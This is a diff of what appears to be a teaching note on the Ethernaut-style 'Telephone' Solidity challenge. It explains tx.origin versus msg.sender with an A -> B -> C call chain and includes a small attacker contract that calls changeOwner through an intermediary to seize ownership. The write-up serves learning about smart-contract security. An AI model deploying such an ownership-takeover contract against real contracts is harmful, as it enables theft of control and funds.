@@ -17,26 +17,32 @@ contract Telephone {
 
 
 contract PsuedoTelephone {
-        
+
     Telephone public pt = Telephone(0x0aa7b75Eb74FB132c1D71e7d27969c7e4a9Cbc41);
     address owner;
-    
+
     constructor() public {
         owner = msg.sender;
     }
-    
+
     function myChangeOwner() public{
-        
+
         pt.changeOwner(owner);
-        
+
     }
 
 }
 
 
 
-The tx.origin global variable refers to the original external account that started the transaction while 
-msg.sender refers to the immediate account (it could be external or another contract account) that invokes the function. 
+For instance, imagine that the externally owned account 'A' calls a function in contract 'B' which calls a function in contract 'C'.
+This super complex call chain results in: A -> B -> C. In B's code, tx.origin and msg.sender would be the same: the address of A.
+Conversely, in C's code, tx.origin and msg.sender would be different: while msg.sender would be B's address, tx.origin would equal A's address.
+
+
+
+The tx.origin global variable refers to the original external account that started the transaction while
+msg.sender refers to the immediate account (it could be external or another contract account) that invokes the function.
 
 
 An example of a possible attack is outlined below.
